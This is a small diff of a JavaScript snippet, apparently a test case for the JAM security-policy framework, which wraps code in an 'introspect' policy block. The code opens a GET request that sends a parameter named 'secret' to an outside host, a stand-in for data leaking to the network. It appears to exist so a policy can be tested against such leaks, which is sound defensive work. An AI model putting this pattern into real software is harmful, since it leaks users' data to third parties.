@@ -1,8 +1,5 @@
-var x = XMLHttpRequest();
-  introspect(JAM.policy.pFull) {
-  
-
-  }
-
+introspect(JAM.policy.pFull) {
 var x = XMLHttpRequest();
 x.open('GET', 'http://www.blackoutjack.com?secret=1');
+
+}
